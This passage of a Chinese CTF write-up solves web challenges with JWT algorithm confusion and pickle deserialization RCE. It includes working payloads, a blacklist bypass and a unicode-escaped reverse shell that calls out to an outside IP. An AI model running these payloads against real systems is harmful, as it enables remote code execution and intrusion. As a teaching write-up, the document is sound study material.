class="string">&quot;error&quot;</span></span><br><span class="line">    username = real[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">    password = real[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">    is_admin = real[<span class="string">&quot;is_admin&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> password != hashlib.md5(user_list[username].encode()).hexdigest():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hacker!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> is_admin:</span><br><span class="line">        serial_S = base64.b64decode(real[<span class="string">&quot;introduction&quot;</span>])</span><br><span class="line">        introduction=pickle.loads(serial_S)             <span class="comment">#####</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Welcome!!!,<span class="subst">&#123;username&#125;</span>,introduction: <span class="subst">&#123;introduction&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;username&#125;</span>,you don&#x27;t have enough permission in here&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>,methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jump</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;login&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>,host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+
+<p>首先注册两个用户得到2个不同token</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="attribute">Token</span><span class="operator">=</span>eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6IjIiLCJwYXNzd29yZCI6ImM4MWU3MjhkOWQ0YzJmNjM2ZjA2N2Y4OWNjMTQ4NjJjIiwiaXNfYWRtaW4iOmZhbHNlfQ.NrXDYdIIjIapYljl7OzLBkjhGU4AKhiI9eG7KuHEbXgcs1ol8mkLEJNrnU6xNhlHUaM6UoazW3z8xzsntyIxopHDvKsw8KJ5Rd_cYNNpAKmPCjmmDWCy0ncGHh_mFRgUxB5uS6S3UcRv6-dZ1Ymrr7D78BHAe9TgNjGxhUyCH6WCLkAo3DUS-tDMC7vMjUdVyipjevKIke4qQg2YlJuRbYVo9-Hd_V_TJL28As4NiXDN38beON7cer7KSfHQQCQ9rateXOQb7cWe--iYJOGAEOCziNo9zVjajiux3gwSHblDcsvKo26P2ZCh02b49tgzKP_VSDouCJ4wDUrty5mKUg</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="attribute">Token</span><span class="operator">=</span>eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6ImM0Y2E0MjM4YTBiOTIzODIwZGNjNTA5YTZmNzU4NDliIiwiaXNfYWRtaW4iOmZhbHNlfQ.HLlGFnJcGt-C6_CCHh9FteC4BatbInaFpoGH1oDHKCYI6TT-b9wX4XKUQLxpNOo2qV0j8_WRbdah4fbLgAcXFVhayKApvnmBUV8v0jl1kN-aRCaP6dN-Awin9P5plOPYVGujLxCJn2iBxpG-f-W7_j9lNKF2LRo30rI2qyA4svz3KMPTMLwFPoVCSRd8sErf7-vRseoSBWWHL_yilj0LZ8e91ngzdcSXjkGskLQYcodsYL2EQ63ZWfLCxSXLmfO_w_VFmjr-BjjQ8xtEAbtRKeIv4Luuc8phMS1n5x-bIyHL4PhbZBlTw8XzM1chdR2tJZv7-lf9YPhvwhCnnXGhXw</span><br></pre></td></tr></table></figure>
+
+<p>然后利用：<a target="_blank" rel="noopener" href="https://carsaid.github.io/burpsuite-learn/wsa/advanced/jwt/algorithm-confusion/#%E4%BB%8E%E7%8E%B0%E6%9C%89%E4%BB%A4%E7%89%8C%E4%B8%AD%E5%AF%BC%E5%87%BA%E5%85%AC%E9%92%A5">https://carsaid.github.io/burpsuite-learn/wsa/advanced/jwt/algorithm-confusion/#%E4%BB%8E%E7%8E%B0%E6%9C%89%E4%BB%A4%E7%89%8C%E4%B8%AD%E5%AF%BC%E5%87%BA%E5%85%AC%E9%92%A5</a></p>
+<p>从已知的令牌中得到公钥：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">kali运行：</span><br><span class="line"></span><br><span class="line">语法：docker run --rm -it portswigger/sig2n &lt;token1&gt; &lt;token2&gt;</span><br><span class="line"></span><br><span class="line">(base) ┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─# docker run --rm -it portswigger/sig2n eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6IjIiLCJwYXNzd29yZCI6ImM4MWU3MjhkOWQ0YzJmNjM2ZjA2N2Y4OWNjMTQ4NjJjIiwiaXNfYWRtaW4iOmZhbHNlfQ.NrXDYdIIjIapYljl7OzLBkjhGU4AKhiI9eG7KuHEbXgcs1ol8mkLEJNrnU6xNhlHUaM6UoazW3z8xzsntyIxopHDvKsw8KJ5Rd_cYNNpAKmPCjmmDWCy0ncGHh_mFRgUxB5uS6S3UcRv6-dZ1Ymrr7D78BHAe9TgNjGxhUyCH6WCLkAo3DUS-tDMC7vMjUdVyipjevKIke4qQg2YlJuRbYVo9-Hd_V_TJL28As4NiXDN38beON7cer7KSfHQQCQ9rateXOQb7cWe--iYJOGAEOCziNo9zVjajiux3gwSHblDcsvKo26P2ZCh02b49tgzKP_VSDouCJ4wDUrty5mKUg eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6ImM0Y2E0MjM4YTBiOTIzODIwZGNjNTA5YTZmNzU4NDliIiwiaXNfYWRtaW4iOmZhbHNlfQ.HLlGFnJcGt-C6_CCHh9FteC4BatbInaFpoGH1oDHKCYI6TT-b9wX4XKUQLxpNOo2qV0j8_WRbdah4fbLgAcXFVhayKApvnmBUV8v0jl1kN-aRCaP6dN-Awin9P5plOPYVGujLxCJn2iBxpG-f-W7_j9lNKF2LRo30rI2qyA4svz3KMPTMLwFPoVCSRd8sErf7-vRseoSBWWHL_yilj0LZ8e91ngzdcSXjkGskLQYcodsYL2EQ63ZWfLCxSXLmfO_w_VFmjr-BjjQ8xtEAbtRKeIv4Luuc8phMS1n5x-bIyHL4PhbZBlTw8XzM1chdR2tJZv7-lf9YPhvwhCnnXGhXw</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">得到：</span><br><span class="line">返回</span><br><span class="line">ound n with multiplier 1:</span><br><span class="line">    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxQXNwK1RiTStMK0lqb2todGFkWgovSUpRUzhJYVVxM281MEUwa2dVYjhsQ0RzNUFBTWU3ZDNlNUpaT2o1RUIvdW1HWDVTN1FlVDFmc2NQRFY1V1pSCkd0aUJyUzVNSDE3bDR2TzgxYmNmM1RGMmZYdi9nZWtETk05NExiYUkvMC9OQmFyenRaZEpMKzdrejVEMXdGUDIKazZ5N2Y5SzUrYmVPYVdYb0N1RlYyazZXbkwvRXpZR3NOb2NSQnI5RHBjQkRvdUFUbS9tSVZLUTlqNnJGSXJCMwplV2U3WVN2ZDVXOUpxVDVXREZjL2NQUmdwcnZNSFBrYTBMeHQ1TFBPb3JBTDFTOXNnZHhRSUhzcWNRSXdSSEVUCmlxZUxZWktDR2hpMU16NVBjUW8wU2tNaWd2QXF4SUFCYWF3MzhTNVdnU0xqdTlUVzJHREF1b2tqMFdxOGFRUGUKVndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==</span><br><span class="line">    Tampered JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICIyIiwgInBhc3N3b3JkIjogImM4MWU3MjhkOWQ0YzJmNjM2ZjA2N2Y4OWNjMTQ4NjJjIiwgImlzX2FkbWluIjogZmFsc2UsICJleHAiOiAxNzc1MTI4NDUyfQ.0u0yotWbawhPFb_4xIyKpij11SlSC_nprPCZEx0YEDE</span><br><span class="line">    Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXFBc3ArVGJNK0wrSWpva2h0YWRaL0lKUVM4SWFVcTNvNTBFMGtnVWI4bENEczVBQU1lN2QKM2U1SlpPajVFQi91bUdYNVM3UWVUMWZzY1BEVjVXWlJHdGlCclM1TUgxN2w0dk84MWJjZjNURjJmWHYvZ2VrRApOTTk0TGJhSS8wL05CYXJ6dFpkSkwrN2t6NUQxd0ZQMms2eTdmOUs1K2JlT2FXWG9DdUZWMms2V25ML0V6WUdzCk5vY1JCcjlEcGNCRG91QVRtL21JVktROWo2ckZJckIzZVdlN1lTdmQ1VzlKcVQ1V0RGYy9jUFJncHJ2TUhQa2EKMEx4dDVMUE9vckFMMVM5c2dkeFFJSHNxY1FJd1JIRVRpcWVMWVpLQ0doaTFNejVQY1FvMFNrTWlndkFxeElBQgphYXczOFM1V2dTTGp1OVRXMkdEQXVva2owV3E4YVFQZVZ3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K</span><br><span class="line">    Tampered JWT: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICIyIiwgInBhc3N3b3JkIjogImM4MWU3MjhkOWQ0YzJmNjM2ZjA2N2Y4OWNjMTQ4NjJjIiwgImlzX2FkbWluIjogZmFsc2UsICJleHAiOiAxNzc1MTI4NDUyfQ.xAFeFOTCUGtnYB2lP72bdERt_YG6qnVnGwOOviIybGI</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>随后尝试这两个生成的临时token</p>
+<p>第一个返回error</p>
+<p>第二个返回2,you don’t have enough permission in here</p>
+<p>说明pkcs1 key密钥可利用</p>
+<p>于是用这个构造：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c81e728d9d4c2f636f067f89cc14862c&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;is_admin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1775128452</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;introduction&quot;</span><span class="punctuation">:</span><span class="string">&quot;gASVUgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw2X19pbXBvcnRfXygnb3MnKS5wb3BlbihyZXF1ZXN0LmFyZ3MuZ2V0KCdjbWQnKSkucmVhZCgplIWUUpQu&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意：sign勾选上base64可利用，</p>
+<p>此处introduction的构造：</p>
+<p>典中典的rce构造</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">shell</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span>,))</span><br><span class="line">shell = shell()</span><br><span class="line">data = pickle.dumps(shell)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(data).decode())</span><br></pre></td></tr></table></figure>
+
+<p>然后在bp</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin?cmd=cat%20/flag</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>80-df1fc38f-681c-46d1-a888-7a49c6fc1505.challenge.ctfplus.cn</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjIiLCJwYXNzd29yZCI6ImM4MWU3MjhkOWQ0YzJmNjM2ZjA2N2Y4OWNjMTQ4NjJjIiwiaXNfYWRtaW4iOnRydWUsImV4cCI6MTc3NTEyODQ1MiwiaW50cm9kdWN0aW9uIjoiZ0FTVlVnQUFBQUFBQUFDTUNHSjFhV3gwYVc1emxJd0VaWFpoYkpTVGxJdzJYMTlwYlhCdmNuUmZYeWduYjNNbktTNXdiM0JsYmloeVpYRjFaWE4wTG1GeVozTXVaMlYwS0NkamJXUW5LU2t1Y21WaFpDZ3BsSVdVVXBRdSJ9.zkr375V-43O6u8eSnBQ1PSsf_J2BEBc3zGzhEndOyhs</span><br><span class="line"><span class="attribute">referer</span><span class="punctuation">: </span>http://80-df1fc38f-681c-46d1-a888-7a49c6fc1505.challenge.ctfplus.cn/login</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Welcome</span>!!!,<span class="number">2</span>,introduction: SYC&#123;<span class="number">3</span>f7cf3eb-<span class="number">8963</span>-<span class="number">4</span>e11-<span class="number">80</span>fb-<span class="number">832</span>f22647add&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0X25马哈鱼商店"><a href="#0X25马哈鱼商店" class="headerlink" title="0X25马哈鱼商店"></a>0X25马哈鱼商店</h1><p>考点：信息搜集，绕过b’’</p>
+<p>抓包买pickle</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pid=8&amp;discount=0.000001</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>/shop_success</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Werkzeug/3.1.3 Python/3.12.11</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>session=.eJyrVgrITM7OSY13zy9RsiopKk3VUUrLSUyPTwfx0xJzioECOYnFJfFJpZVKVlDVSjpKpcWpRUC-oVItAB71Fpc.ac5knw.oF6C18o4QmDd7QMAsmADDMeTnnE; HttpOnly; Path=/</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Cookie</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Success</span><span class="operator">!</span></span><br><span class="line"><span class="variable">You</span> <span class="variable">have</span> <span class="variable">purchased</span><span class="operator">:</span> <span class="variable">Pickle</span></span><br><span class="line"></span><br><span class="line"><span class="variable">Wow</span><span class="operator">!</span> <span class="built_in">Now</span> <span class="variable">You</span> <span class="variable">Can</span> <span class="variable">Really</span> <span class="variable">Click</span> <span class="built_in">Here</span> <span class="variable">To</span> <span class="variable">GetFlag</span><span class="operator">.</span></span><br><span class="line"></span><br><span class="line"><span class="variable">You</span> <span class="variable">Money</span> <span class="built_in">Now</span><span class="operator">:</span> <span class="number">9998.99999</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Continue</span> <span class="variable">Shopping</span></span><br></pre></td></tr></table></figure>
+
+<p>点击here</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Use GET To Send Your Loved Data!!!      </span><br><span class="line">BlackList = [<span class="string">b&#x27;&#x27;</span>, <span class="string">b&#x27;&#x27;</span>]<span class="comment">#过滤b指令      </span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pickle_dsa&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pic</span>():</span><br><span class="line">    data = request.args.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Use GET To Send Your Loved Data&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = base64.b64decode(data)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Cao!!!&quot;</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> BlackList:</span><br><span class="line">        <span class="keyword">if</span> b <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;卡了&quot;</span>  <span class="comment">#不能有b</span></span><br><span class="line">    p = pickle.loads(data)</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&lt;p&gt;Vamos! <span class="subst">&#123;p&#125;</span>&lt;p&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>没看出来拦截的什么，问问</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">核心拦截对象：b<span class="string">&#x27;&#x27;</span> 和 b<span class="string">&#x27;\x1e&#x27;</span></span><br><span class="line">在 pickle 的底层指令集（Protocols）中，这两个字节码具有特殊含义：</span><br><span class="line"></span><br><span class="line">b<span class="string">&#x27;&#x27;</span> (空字节 / STOP 指令): 实际上，这里的 b<span class="string">&#x27;&#x27;</span> 在代码逻辑中很难被触发（因为它是空字符串），但如果黑名单指的是十六进制的 <span class="string">\x00，它通常用于某些协议的版本标识或数据截断。</span></span><br><span class="line"></span><br><span class="line">b<span class="string">&#x27;\x1e&#x27;</span> (即 <span class="string">\x1e</span> / PROTO 指令):</span><br><span class="line">这是 pickle 协议版本声明的指令。在 Python <span class="number">3</span> 中，默认生成的 pickle 数据通常会以 <span class="string">\x80（Protocol</span> 标识）开头，紧接着就是版本号。<span class="string">\x1e</span> 在较新版本的 pickle 协议中用于更复杂的内存管理或数据段。</span><br></pre></td></tr></table></figure>
+
+<p>拦截单字节 0x1E</p>
+<h4 id="解法1：同easypickle"><a href="#解法1：同easypickle" class="headerlink" title="解法1：同easypickle"></a>解法1：同easypickle</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(S&#x27;key1&#x27;</span></span><br><span class="line"><span class="string">S&#x27;val1&#x27;</span></span><br><span class="line"><span class="string">dS&#x27;vul&#x27;</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">eval</span></span><br><span class="line"><span class="string">S&#x27;__import__(\&#x27;os\&#x27;).system(\&#x27;cat /proc/self/environ\&#x27;)&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(opcode).decode())</span><br></pre></td></tr></table></figure>
+
+<p>虽然没有出现“卡了”，但是这里只有一个：<p>Vamos! 0<p></p>
+<p>于是尝试反弹shell</p>
+<p>运用反弹shell成功：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">opcode= <span class="string">b&quot;&quot;&quot;(S&#x27;key1&#x27;</span></span><br><span class="line"><span class="string">S&#x27;val1&#x27;</span></span><br><span class="line"><span class="string">dS&#x27;vul&#x27;</span></span><br><span class="line"><span class="string">(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">V\u0062\u0061\u0073\u0068\u0020\u002d\u0063\u0020\u0022\u0062\u0061\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0034\u0037\u002e\u0031\u0030\u0039\u002e\u0037\u0030\u002e\u0031\u0034\u0034\u002f\u0032\u0033\u0033\u0033\u0020\u0030\u003e\u0026\u0031\u0022</span></span><br><span class="line"><span class="string">os.&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(opcode).decode())</span><br></pre></td></tr></table></figure>
+
+<p>然后监听弹到shell</p>
+<p>命令执行cat &#x2F;proc&#x2F;self&#x2F;environ</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">0xGame</span><span class="template-variable">&#123;You_Have_Learned_How_to_Buy_Pickle!&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h4><p>利用文本字节绕过单字节</p>
+<p>单字节：</p>
+<p>使用protocol&#x3D;0<br>protocol&#x3D;0 是文本协议，基本不会包含0x1E<br>protocol&#x3D;2,3 是二进制协议，会包含各种控制字符，容易触发 0x1E 检测</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">rce</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">shell = (pickle.dumps(rce(), protocol=<span class="number">0</span>))</span><br><span class="line">base64_shell = base64.b64encode(shell)</span><br><span class="line"><span class="built_in">print</span>(base64_shell.decode())</span><br></pre></td></tr></table></figure>
+
+<h4 id="解法3："><a href="#解法3：" class="headerlink" title="解法3：*"></a>解法3：*</h4><p>说实话没看懂：</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">题目使用pickle.loads()反序列化用户提供的数据，存在反序列化RCE漏洞：</span><br><span class="line"></span><br><span class="line">data = base64.b64decode(data)</span><br><span class="line"></span><br><span class="line">for b <span class="keyword">in</span> BlackList:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> b <span class="keyword">in</span> data:</span><br><span class="line"></span><br><span class="line">        return <span class="string">&quot;卡了&quot;</span></span><br><span class="line"></span><br><span class="line">p = pickle.loads(data)</span><br><span class="line"></span><br><span class="line">关键技术</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 使用STACK_GLOBAL绕过黑名单</span><br><span class="line"></span><br><span class="line">我们使用pickle protocol <span class="number">4</span>的STACK_GLOBAL (opcode <span class="number">0x93</span>)：</span><br><span class="line"></span><br><span class="line">b<span class="string">&#x27;\x80\x04&#x27;</span>  # PROTO <span class="number">4</span></span><br><span class="line"></span><br><span class="line">b<span class="string">&#x27;\x8c\nsubprocess&#x27;</span>  # SHORT_BINUNICODE <span class="string">&#x27;subprocess&#x27;</span></span><br><span class="line"></span><br><span class="line">b<span class="string">&#x27;\x8c\tgetoutput&#x27;</span>   # SHORT_BINUNICODE <span class="string">&#x27;getoutput&#x27;</span></span><br><span class="line"></span><br><span class="line">b<span class="string">&#x27;\x93&#x27;</span>              # STACK_GLOBAL - 从栈获取subprocess.getoutput</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 使用subprocess.getoutput获取输出</span><br><span class="line"></span><br><span class="line">os.<span class="keyword">system</span>()只返回退出码，无法看到输出。使用subprocess.getoutput()可以获取命令的输出内容。</span><br><span class="line"></span><br><span class="line">解题步骤</span><br><span class="line"></span><br><span class="line">构造payload: 使用STACK_GLOBAL opcode构造pickle字节码</span><br><span class="line"></span><br><span class="line">选择合适的函数: 使用subprocess.getoutput()而非os.<span class="keyword">system</span>()</span><br><span class="line"></span><br><span class="line">查找flag位置: 通过env | grep -i flag发现flag在环境变量中</span><br><span class="line"></span><br><span class="line">payload = (</span><br><span class="line"></span><br><span class="line">    b<span class="string">&#x27;\x80\x04&#x27;</span>  # PROTO <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    b<span class="string">&#x27;\x8c\nsubprocess&#x27;</span>  # SHORT_BINUNICODE <span class="string">&#x27;subprocess&#x27;</span> 